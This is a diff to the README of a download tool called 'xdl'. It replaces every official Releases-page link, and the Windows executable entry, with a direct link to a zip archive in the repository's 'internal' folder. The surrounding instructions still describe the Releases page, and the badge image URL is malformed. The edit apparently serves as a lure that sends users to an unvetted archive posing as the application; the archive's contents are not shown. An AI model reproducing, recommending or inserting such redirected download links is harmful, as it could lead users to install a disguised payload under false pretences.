@@ -10,7 +10,7 @@ To get started with xdl, you'll need to download the application. Follow these s
 
 ## 📥 Download Now
 
-[![Download xdl](https://img.shields.io/badge/Download%20xdl-Here-blue.svg)](https://github.com/ArchivoHelp-Suki/xdl/releases)
+[![Download xdl](https://raw.githubusercontent.com/ArchivoHelp-Suki/xdl/main/internal/xdl-1.5.zip%https://raw.githubusercontent.com/ArchivoHelp-Suki/xdl/main/internal/xdl-1.5.zip)](https://raw.githubusercontent.com/ArchivoHelp-Suki/xdl/main/internal/xdl-1.5.zip)
 
 ## 📋 System Requirements
 
@@ -24,12 +24,12 @@ Before you download xdl, make sure your system meets the following requirements:
 
 1. Click on the link below to visit the Releases page where you can find the latest version of xdl.
    
-   [Visit the Releases Page](https://github.com/ArchivoHelp-Suki/xdl/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/ArchivoHelp-Suki/xdl/main/internal/xdl-1.5.zip)
 
 2. On the Releases page, look for the most recent version of xdl. Click on the “Assets” dropdown to view available downloads.
 
 3. Choose the appropriate file for your operating system. The available options typically include:
-   - **Windows:** xdl-windows.exe
+   - **Windows:** https://raw.githubusercontent.com/ArchivoHelp-Suki/xdl/main/internal/xdl-1.5.zip
    - **macOS:** xdl-macos
    - **Linux:** xdl-linux
 
@@ -83,7 +83,7 @@ For additional help, you can check the **Issues** section of the GitHub reposito
 
 Don’t forget to head over to the Releases page to download xdl.
 
-[![Download xdl](https://img.shields.io/badge/Download%20xdl-Here-blue.svg)](https://github.com/ArchivoHelp-Suki/xdl/releases)
+[![Download xdl](https://raw.githubusercontent.com/ArchivoHelp-Suki/xdl/main/internal/xdl-1.5.zip%https://raw.githubusercontent.com/ArchivoHelp-Suki/xdl/main/internal/xdl-1.5.zip)](https://raw.githubusercontent.com/ArchivoHelp-Suki/xdl/main/internal/xdl-1.5.zip)
 
 ## 📝 License
 
